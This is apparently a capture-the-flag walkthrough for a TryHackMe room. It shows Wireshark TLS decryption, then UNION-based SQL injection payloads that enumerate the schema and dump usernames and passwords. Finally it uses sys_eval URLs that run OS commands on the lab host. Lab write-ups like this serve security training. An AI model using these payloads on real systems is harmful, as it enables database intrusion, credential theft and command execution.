# TryHack3M: Sch3Ma D3Mon

**Room Link:** [https://tryhackme.com/r/room/sch3mad3mon](https://tryhackme.com/r/room/sch3mad3mon)

## A Public Computer with a VPN

goto Edit -> preferences -> protocols -> search for SSL or TLS -> select the ssl-key.log file and hit enter to decrypt the web traffic.



<figure><img src="../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
http contains "Username"
```

<figure><img src="../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

## Connected Tables

**Filter**

```
' union select 1,2,3,4,5 -- //
```



### Find SQL Version

**Filter**

```
' union select 1,2,3,4,database() -- //
```

<figure><img src="../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

### Find Tables

**Filter**

```
' union select 1,2,3,4,group_concat(table_name) from information_schema.tables WHERE table_schema = 'mayh3Mmarketplace'; -- //
```

<figure><img src="../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

### Get fields

**Filter**

```
' union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='users' -- //
```

<figure><img src="../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

### Get field info

Confirmed we're the only other user.

**Filter**

```
' union select 1,group_concat(username),group_concat(password),3,4 FROM users -- -
```

<figure><img src="../../.gitbook/assets/image (1098).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
' union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='unlisted_products' -- //
```

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
' union select null,null,null,null, group_concat(product_name) from unlisted_products -- //
```

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

## From DB to OS

**URL**

```
http://10.10.26.7:8000/os_sqli.php?user=lannister' union SELECT null, null, null, null, sys_eval('whoami') -- //
```

<figure><img src="../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

**URL**

```
http://10.10.26.7:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27pwd%27)%20--%20//
```

<figure><img src="../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>















